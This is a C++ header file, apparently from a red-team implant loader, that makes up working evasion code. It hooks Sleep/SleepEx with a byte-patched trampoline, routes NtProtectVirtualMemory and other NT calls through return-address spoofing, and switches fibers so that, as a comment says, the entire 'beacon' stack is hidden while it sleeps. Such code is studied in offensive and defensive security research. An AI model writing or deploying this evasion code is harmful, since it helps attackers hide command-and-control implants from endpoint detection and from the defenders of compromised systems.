#pragma once

#include "functions.h"
#include "retaddrspoof.h"

extern PVOID Gdgt;
extern LPVOID InitialFiber;

DWORD dwSleepTime;

/// <summary>
/// This function applies a "Trampoline-Based" Hooking, its shit, BUT it works 
/// </summary>
/// <param name="FunctionToHook"></param>
/// <param name="RedirectionFunction"></param>
/// <returns></returns>
VOID HookFunction(PVOID FunctionToHook, PVOID RedirectionFunction) {

    uint8_t uHook[] = {
        0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x41, 0xFF, 0xE2                                            
    };

    uint64_t uPatch = (uint64_t)RedirectionFunction;
    RetSpoofCall((void*)memcpy, 2, Gdgt ,&uHook[2], &uPatch, sizeof(uPatch));

    DWORD oldProtect = 0;
    SIZE_T regionSize = sizeof(uHook);

    PVOID baseAddress = FunctionToHook;

    NTSTATUS status = reinterpret_cast<NTSTATUS>(RetSpoofCall((void*)NtProtectVirtualMemory, 5, Gdgt, SELF_HANDLE, &baseAddress, &regionSize, PAGE_READWRITE, &oldProtect));
    NTAPI_VALIDATE_RETURN2VOID(NtProtectHook1, status);

    RetSpoofCall((void*)memcpy, 3, Gdgt , FunctionToHook, uHook, sizeof(uHook));

    status = reinterpret_cast<NTSTATUS>(RetSpoofCall((void*)NtProtectVirtualMemory, 5, Gdgt, SELF_HANDLE, &baseAddress, &regionSize, oldProtect, &oldProtect));
    NTAPI_VALIDATE_RETURN2VOID(NtProtectHook2, status);

#ifdef _DEBUG_PRINT
    std::cout << "[DEBUG] Installed a Function Hook!\n";
#endif
    return;
}





/// <summary>
/// a hook to the Sleep/SleepEx function causes the executed fiber to switch back to the Initial Fiber
/// </summary>
/// <param name="dwMilliseconds"></param>
/// <param name=""></param>
extern "C" void FiberSwitcher(DWORD dwMilliseconds, ...) {
    
    dwSleepTime = dwMilliseconds; // so we can ACTUALLY sleep 

#ifdef _DEBUG_PRINT
    std::cout << "[PAYLOAD] Switching to intial fiber\n";
#endif

    RetSpoofCall((void*)e_SwitchToFiber, 1, Gdgt, InitialFiber); // when this is executed by the "beacon" the entire beacon stack gets hidden for the time it sleeps
    
    return;
}


/// <summary>
/// a custom sleep function
/// </summary>
/// <param name="dwMilliseconds"></param>
extern "C" void DelayExecution(DWORD dwMilliseconds) {

    LARGE_INTEGER DelayInterval = { 0 };
    LONGLONG Delay = NULL;
    HANDLE hEvent = NULL;

    RetSpoofCall((void*)NtCreateEvent, 5, Gdgt, &hEvent, EVENT_ALL_ACCESS, NULL, 0, FALSE);
    Delay = dwMilliseconds * 10000;
    DelayInterval.QuadPart = -Delay;
    RetSpoofCall((void*)NtWaitForSingleObject, 3, Gdgt, hEvent, FALSE, &DelayInterval);

    return;
    
}
